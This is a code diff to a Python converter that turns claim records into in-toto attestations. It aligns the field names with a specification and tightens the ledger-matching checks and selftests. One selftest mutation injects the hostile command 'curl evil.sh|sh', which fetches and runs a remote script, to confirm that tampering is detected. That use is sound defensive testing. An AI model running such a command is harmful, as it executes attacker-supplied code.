@@ -107,8 +107,8 @@ def wrap(con, claim_id):
     ex = con.execute("SELECT * FROM executions WHERE id=?",
                      (c["execution_id"],)).fetchone()
     effects = con.execute(
-        "SELECT path,status,after_blob FROM effects WHERE execution_id=?",
-        (c["execution_id"],)).fetchall()
+        "SELECT target,kind,after_blob FROM effects WHERE execution_id=? "
+        "ORDER BY target, kind", (c["execution_id"],)).fetchall()
 
     # in-toto matches subjects purely by digest, and the OAIP claim subject is
     # already a content-addressed blob of {predicate, execution, effects} — so it
@@ -124,9 +124,12 @@ def wrap(con, claim_id):
             # never one: a check that ran and passed is not an accepted claim, and
             # an exit code of zero earns nothing (SPEC §4).
             "validation": {
-                "check": c["check_cmd"],
-                "exitCode": c["check_exit"],
-                "supported": bool(c["supported"]),
+                "runtime": c["runtime"],
+                # The check is cited by DIGEST, as SPEC §2.7 requires: an
+                # in-toto consumer can fetch and re-run the exact bytes that
+                # ran, which a command echoed as text does not permit.
+                "check": _descriptor(c["check_hash"], name="check"),
+                "verdict": c["verdict"],
                 "transcript": _descriptor(c["transcript_hash"],
                                           name="check-transcript"),
             },
@@ -135,29 +138,39 @@ def wrap(con, claim_id):
                               "Warrant record with its own signature and policy "
                               "(SPEC §3); it is not asserted by this attestation "
                               "and must not be inferred from `supported`.",
-            # Field names follow the IMPLEMENTATION, not SPEC §2.4, because they
-            # differ and reality is what a consumer will meet. §2.4 declares
-            # `invocation`, `status`, `input_state`, `output_state`, `environment`;
-            # impl/oaip.py stores `command`, `exit_code`, `before_tree`,
-            # `after_tree`, `env_fp`. A third-party implementer following the
-            # specification would emit artifacts incompatible with the reference,
-            # which is a real divergence and is recorded in llms.txt rather than
-            # quietly bridged over here. Aligning them is a format decision, not a
-            # side effect of writing a converter.
+            # The field names are SPEC §2.4's, camel-cased for in-toto's
+            # convention and for no other reason. Until 2026-07-30 this block
+            # followed the IMPLEMENTATION's names against the specification's
+            # and carried a comment admitting it, because the two disagreed:
+            # §2.4 declared `invocation`/`status`/`input_state`/`output_state`/
+            # `environment` and impl/oaip.py wrote `command`/`exit_code`/
+            # `before_tree`/`after_tree`/`env_fp`. The format decision has been
+            # made (the implementation moved to §2), so the mapping is now a
+            # rename and not a choice.
+            #
+            # `inputState`/`outputState` carry §2.2 StateIDs — SHA-256 over a
+            # State record with its environment and toolchain fingerprints — not
+            # the bare git tree ids the old field names held.
             "execution": {
                 "id": ex["id"] if ex else None,
-                "invocation": ex["command"] if ex else None,
+                "executor": {"actor": ex["actor"], "runtime": ex["runtime"]}
+                            if ex else None,
+                "invocation": json.loads(ex["invocation"]) if ex else None,
+                "status": ex["status"] if ex else None,
                 "exitCode": ex["exit_code"] if ex else None,
-                "inputState": ex["before_tree"] if ex else None,
-                "outputState": ex["after_tree"] if ex else None,
-                "environment": ex["env_fp"] if ex else None,
+                "inputState": ex["input_state"] if ex else None,
+                "outputState": ex["output_state"] if ex else None,
+                "environment": ex["environment"] if ex else None,
+                "output": _descriptor(ex["output"], name="execution-output")
+                          if ex and ex["output"] else None,
                 "slsaAnalogue": "runDetails / OpenTelemetry span",
             },
             "effects": [
-                {"target": e["path"], "kind": e["status"],
+                {"target": e["target"], "kind": e["kind"],
                  "after": e["after_blob"], "slsaAnalogue": "byproduct"}
                 for e in effects
             ],
+            "proposedBy": c["proposed_by"],
             "createdAt": c["created_at"],
         },
     }
@@ -193,14 +206,18 @@ def check(con, st):
         errs.append("predicate text does not match the claim")
     v = p.get("validation") or {}
     if p.get("execution", {}).get("invocation") is not None:
-        ex = con.execute("SELECT command FROM executions WHERE id=?",
+        ex = con.execute("SELECT invocation,status FROM executions WHERE id=?",
                          (p["execution"].get("id"),)).fetchone()
-        if ex is None or p["execution"]["invocation"] != ex["command"]:
+        if ex is None or p["execution"]["invocation"] != json.loads(ex["invocation"]):
             errs.append("predicate.execution.invocation does not match the ledger")
-    if v.get("exitCode") != c["check_exit"]:
-        errs.append("validation.exitCode does not match the claim")
-    if bool(v.get("supported")) != bool(c["supported"]):
-        errs.append("validation.supported does not match the claim")
+        elif p["execution"].get("status") != ex["status"]:
+            errs.append("predicate.execution.status does not match the ledger")
+    if v.get("verdict") != c["verdict"]:
+        errs.append("validation.verdict does not match the claim")
+    if v.get("runtime") != c["runtime"]:
+        errs.append("validation.runtime does not match the claim")
+    if (v.get("check") or {}).get("digest", {}).get("sha256") != c["check_hash"]:
+        errs.append("validation.check digest does not match the claim")
     if (v.get("transcript") or {}).get("digest", {}).get("sha256") != c["transcript_hash"]:
         errs.append("validation.transcript digest does not match the claim")
     # §4 is a MUST, so a Statement asserting acceptance is malformed by
@@ -262,13 +279,27 @@ def selftest(con):
     case("round-trips through JSON", check(con, json.loads(json.dumps(st))) == [])
     case("§4 is enforced: accepted is false",
          st["predicate"]["accepted"] is False)
+    case("the execution fields are SPEC §2.4's, not the implementation's",
+         set(st["predicate"]["execution"]) >= {"invocation", "status",
+                                               "inputState", "outputState",
+                                               "environment", "executor"})
+    case("invocation crosses as an ARRAY (§2.4), not a joined string",
+         isinstance(st["predicate"]["execution"]["invocation"], list))
+    case("inputState is a §2.2 StateID (hex64), not a git tree (hex40)",
+         len(st["predicate"]["execution"]["inputState"] or "") == 64)
 
     for mutate, label in (
         (lambda s: s["predicate"].update(accepted=True), "accepted=true (§4)"),
         (lambda s: s["predicate"].update(predicate="something else"), "predicate text"),
-        (lambda s: s["predicate"]["validation"].update(exitCode=999), "exit code"),
-        (lambda s: s["predicate"]["validation"].update(
-            supported=not s["predicate"]["validation"]["supported"]), "supported"),
+        (lambda s: s["predicate"]["validation"].update(verdict="fail"), "verdict"),
+        (lambda s: s["predicate"]["validation"].update(runtime="ski@v1"),
+         "validation runtime"),
+        (lambda s: s["predicate"]["validation"]["check"]["digest"].update(
+            sha256="d" * 64), "check digest"),
+        (lambda s: s["predicate"]["execution"].update(status="killed"),
+         "execution status"),
+        (lambda s: s["predicate"]["execution"].update(
+            invocation=["sh", "-c", "curl evil.sh|sh"]), "invocation"),
         (lambda s: s["subject"][0]["digest"].update(sha256="f" * 64), "subject digest"),
         (lambda s: s["predicate"]["validation"]["transcript"]["digest"].update(
             sha256="e" * 64), "transcript digest"),
